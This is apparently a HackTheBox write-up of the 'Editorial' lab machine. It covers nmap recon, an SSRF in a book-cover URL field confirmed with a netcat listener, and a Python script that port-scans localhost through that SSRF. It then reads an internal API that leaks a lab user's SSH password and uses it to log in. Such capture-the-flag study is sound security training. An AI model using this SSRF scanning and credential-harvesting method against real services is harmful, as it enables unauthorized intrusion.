---
title: "Editorial"
date: 2026-06-26 07:00:00 -0500
categories: [HackTheBox, Linux]
tags: [hackthebox, linux, easy, ssrf, internal-api, credential-disclosure, git, information-leak]
image:
    path: /assets/Images/Editorial-avatar.png
    alt: Editorial
description: "A publishing site's book-cover URL field is fetched server-side with no SSRF protection, letting us reach an internal API on localhost:5000 whose authors endpoint leaks plaintext SSH credentials for the user flag."
---
## Overview

Editorial is an easy-difficulty Linux box built around a single server-side request forgery (SSRF) flaw. The "Publish with us" form lets you submit a book cover by URL, and the server dutifully fetches whatever URL you give it — including services bound only to localhost. Fuzzing the loopback interface uncovers an internal API on port 5000, and one of its endpoints returns a welcome-mail template with cleartext SSH credentials. This post covers recon through the user flag.

## Machine Matrix

<div style="text-align:center;margin:1.5rem 0;">
<svg viewBox="-60 0 420 300" width="420" style="max-width:100%;font-family:sans-serif;font-size:13px;">
  <polygon points="150.0,40.0 254.6,116.0 214.7,239.0 85.3,239.0 45.4,116.0" fill="none" stroke="#888" stroke-opacity="0.4"/>
  <polygon points="150.0,76.7 219.7,127.4 193.1,209.3 106.9,209.3 80.3,127.4" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <polygon points="150.0,113.4 184.8,138.7 171.5,179.6 128.5,179.6 115.2,138.7" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <g stroke="#888" stroke-opacity="0.4">
    <line x1="150" y1="150" x2="150.0" y2="40.0"/>
    <line x1="150" y1="150" x2="254.6" y2="116.0"/>
    <line x1="150" y1="150" x2="214.7" y2="239.0"/>
    <line x1="150" y1="150" x2="85.3" y2="239.0"/>
    <line x1="150" y1="150" x2="45.4" y2="116.0"/>
  </g>
  <polygon points="150.0,62.0 233.7,122.8 150.0,150.0 124.1,185.6 150.0,150.0" fill="#9fef00" fill-opacity="0.3" stroke="#9fef00" stroke-width="2"/>
  <g fill="currentColor" text-anchor="middle">
    <text x="150" y="28">Enumeration</text>
    <text x="278" y="112" text-anchor="start">Real-Life</text>
    <text x="226" y="258" text-anchor="start">CVE</text>
    <text x="74" y="258" text-anchor="end">Custom Exploitation</text>
    <text x="22" y="112" text-anchor="end">CTF-like</text>
  </g>
</svg>
</div>

Classic SSRF box: an unprotected book-cover fetch is scripted to port-scan localhost and pull cleartext SSH creds from an internal API — realistic, enumeration-heavy, no CVE.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | OpenSSH 8.9p1 | Ubuntu |
| 80/tcp | nginx 1.18.0 | redirects to `editorial.htb` |

```bash
nmap -sC -sV 10.10.11.20
```

Two ports. The web server redirects to a hostname, so add it to `/etc/hosts`:

```bash
echo "10.10.11.20  editorial.htb" | sudo tee -a /etc/hosts
```

Visiting `http://editorial.htb` shows a publishing company site. The navigation bar has a **Publish with us** page with a book-submission form — and one of its fields is a **Cover URL**.

## Enumeration

The Cover URL field is the obvious SSRF candidate: the server fetches it to render a preview thumbnail. Point it at our own listener to confirm.

```bash
nc -lnvp 5555
```

Submit the form (or replay the `POST /upload-cover` request) with the cover URL set to `http://<our-ip>:5555`. The listener catches a callback from `python-requests/2.25.1` — the server fetched our URL. SSRF confirmed.

Probing `http://127.0.0.1:80` returns a `.jpeg` path. That gives us an oracle: ports with no useful service return a `.jpeg`, so we can fuzz every port and flag the one response that does **not** end in `.jpeg`.

```python
#!/usr/bin/python3
import requests
for port in range(1, 65536):
    r = requests.post("http://editorial.htb/upload-cover",
                      files={"bookfile": ("x", b"")},
                      data={"bookurl": f"http://127.0.0.1:{port}"})
    if not r.text.strip().endswith(".jpeg"):
        print(port, "---", r.text)
```

```
5000 --- static/uploads/85389d97-3812-4851-b49e-1f843f356e45
```

Port `5000` is different — there's an internal API listening on localhost.

## Foothold

Set the cover URL to the API metadata endpoint and read the file the server saved:

```bash
# bookurl = http://127.0.0.1:5000/api/latest/metadata
curl http://editorial.htb/static/uploads/<returned-uuid> | jq
```

The JSON describes the API's endpoints. The `/api/latest/metadata/messages/authors` endpoint looks promising — it claims to return the welcome message sent to new authors. Query it through the SSRF the same way:

```bash
# bookurl = http://127.0.0.1:5000/api/latest/metadata/messages/authors
curl http://editorial.htb/static/uploads/<returned-uuid> | jq
```

```json
{
  "template_mail_message": "Welcome to the team! ... Your login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\n..."
}
```

Cleartext credentials for `dev`. They work over SSH:

```bash
ssh dev@10.10.11.20
```

```
dev@editorial:~$ id
uid=1001(dev) gid=1001(dev) groups=1001(dev)
```

## User flag

```bash
dev@editorial:~$ cat user.txt
[redacted]
```

Foothold complete. The path to root continues through credentials buried in a local Git repository and a GitPython sudo flaw (CVE-2022-24439) — but this post stops at user.

Privilege escalation is left as an exercise — this post ends at the user flag.


<div style="text-align:center;margin-top:2rem;">
  <img src="/assets/Images/Editorial-avatar.png" alt="Editorial" width="200" height="200" style="border-radius:8px;" />
  <p style="margin-top:1rem;">
    <a href="https://patreon.com/Infinit3i?utm_medium=unknown&utm_source=join_link&utm_campaign=creatorshare_creator&utm_content=copyLink"
       style="display:inline-block;background:#FF424D;color:#fff;font-weight:600;padding:0.6rem 1.4rem;border-radius:9999px;text-decoration:none;">
      Find more on Patreon
    </a>
  </p>
</div>
